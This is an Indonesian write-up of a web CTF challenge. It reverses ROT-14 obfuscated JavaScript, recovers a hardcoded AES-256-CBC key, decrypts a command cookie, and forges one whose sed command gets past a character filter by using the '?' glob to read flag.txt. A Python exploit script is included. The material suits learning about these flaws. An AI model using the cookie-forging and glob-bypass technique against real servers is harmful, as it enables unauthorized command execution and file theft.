# BhAcKAri Streaming Service - CTF Writeup

**Challenge:** BhAcKAri Streaming Service  
**Category:** Web  
**Flag:** `bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}`

---

## Overview

Website streaming anime palsu yang menyembunyikan "ad server" tersembunyi. Challenge ini melibatkan:
1. Reverse engineering JavaScript yang di-obfuscate
2. Decode ROT-14 cipher
3. Decode custom encoding scheme
4. Decrypt AES-256-CBC cookie
5. Eksekusi command via sed dengan bypass filter

---

## Walkthrough

### Step 1: Reconnaissance

```bash
curl http://streaming.challs.ctf.bhackari.it:8000/
```

HTML mengandung JavaScript besar yang di-obfuscate. Ada dua hal mencurigakan:
- **Cookie `payload`** di-set dengan nilai hex panjang
- **Ad server** di port 5687

### Step 2: Decode ROT-14 Obfuscation

Semua string dalam JS di-encode dengan ROT-14 (substitusi Caesar +14). Decode key constants:

| Encoded | Decoded |
|---------|---------|
| `xaomxtaef:5687` | `localhost:5687` |
| `efdqmyuzs.otmxxe...` | `streaming.challs...` |
| `pahd=fdgq` | `dovr=true` |
| `/mpe` | `/ads` |
| `BAEF` | `POST` |
| `bmkxamp` | `payload` |

Ad server menerima **POST ke `/`** dengan cookie `payload`.

### Step 3: Decode Custom Encoding (Fe function)

Di `player.html` ada komentar `/*use this abdul*/` dan fungsi `Fe()` yang decode string tersembunyi. String di akhir script berisi pesan dari sysadmin ke "Abdul":

```javascript
// Decode dengan node.js
const vo = 'YzR(vh&ekK7r-]syW5=9lH^3qS~MwEoZ*6#:i}NBtAcpV1)4T_0mjUO[xQJuCG2ndP!XI/LDF@8fb|ga,';
function Fe(e) { ... }
Fe(encodedString)
```

Output:
```json
{
    "description": "Abdul, my friend, this is the command to write the stolen datas on our logs. 
    The server accepts only sed commands with letters and {' ', '-', '?'}.
    DONT EVEN TRY to touch my flag.txt I blocked the world flag",
    "algo": "AES256",
    "key-uft-8": "inshallah_nobody_will_steal_this",
    "IV": "00000000000000000000000000000000",
    "Mode": "CBC"
}
```

**Key ditemukan!** AES-256-CBC dengan:
- Key: `inshallah_nobody_will_steal_this`
- IV: 16 null bytes

### Step 4: Decrypt Cookie

Cookie `payload` adalah AES-256-CBC encrypted JSON berisi perintah `sed`:

```python
from Crypto.Cipher import AES
key = b'inshallah_nobody_will_steal_this'
iv = bytes(16)
ct = bytes.fromhex(cookie_value)
AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
```

Hasil decrypt dari index.html cookie:
```json
{
    "cmd": "sed --help",
    "message": "...server accept only sed commands with letters and {' ', '-', '?'}...",
    "location": "IT",
    "zoneId": 8604706,
    "stolen_datas": "bla bla bla"
}
```

### Step 5: Analisis Server

Server di port 5687:
- Menerima **POST ke `/`** dengan cookie `payload`
- Decrypt cookie, parse JSON, eksekusi field `cmd` sebagai sed command
- Filter: hanya karakter **huruf, spasi, `-`, `?`** yang diizinkan
- `flag.txt` diblok secara eksplisit by name
- Opsi sed `-e`, `-f` diblok

### Step 6: Exploit - Glob Bypass dengan `?`

Karakter `?` diizinkan oleh filter karena sysadmin hanya memikirkan sed options, bukan **shell glob wildcard**!

`flag?txt` akan di-expand oleh shell menjadi `flag.txt` karena `?` match satu karakter apapun.

```python
from Crypto.Cipher import AES

key = b'inshallah_nobody_will_steal_this'
iv  = bytes(16)

cmd = '{"cmd": "sed -n p flag?txt"}\n'
pad = 16 - (len(cmd) % 16)
ct  = AES.new(key, AES.MODE_CBC, iv).encrypt(cmd.encode() + bytes([pad]*pad))

# Kirim ke server
import requests
requests.post(
    "http://streaming.challs.ctf.bhackari.it:5687/",
    cookies={"payload": ct.hex()}
)
```

### Step 7: Flag!

```
bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}
```

---

## Summary of Vulnerabilities

1. **Obfuscated credentials** - AES key tersembunyi dalam JS obfuscated tapi bisa di-reverse
2. **Cookie-based RCE** - Server mengeksekusi command dari encrypted cookie
3. **Incomplete input validation** - Filter mengizinkan `?` tanpa memikirkan glob expansion
4. **Sensitive data in client-side code** - Key enkripsi ada di JavaScript publik

---

## Tools Used

- `curl` - HTTP requests
- `node.js` - Decode JS obfuscation
- `python3` + `pycryptodome` - AES decrypt/encrypt
